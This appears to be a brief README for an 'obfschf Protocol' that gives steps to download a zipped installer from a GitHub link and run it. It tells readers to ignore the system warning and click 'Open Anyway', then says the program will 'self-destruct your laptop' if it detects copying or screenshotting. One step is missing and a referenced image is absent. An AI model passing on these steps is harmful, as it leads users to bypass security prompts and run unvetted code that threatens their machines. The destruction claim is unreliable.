# obfschf Protocol
## Download instructions
1. Download the installer from [here](https://github.com/johannlo2013/obfschf/raw/refs/heads/main/HFInstaller.zip)
2. Execute it by double-clicking it.
3. It will pop-up with the following message. Ignore it and press "Done"

5. Click on "Open Anyway". This is only because it downloads the folder from the internet and unzips it automatically.
6. Once opened, it will start downloading, and a folder will pop up on your screen.
7. The folder will self-destruct in 5 minutes. If it detects copying or screenshotting, it will self-destruct your laptop.
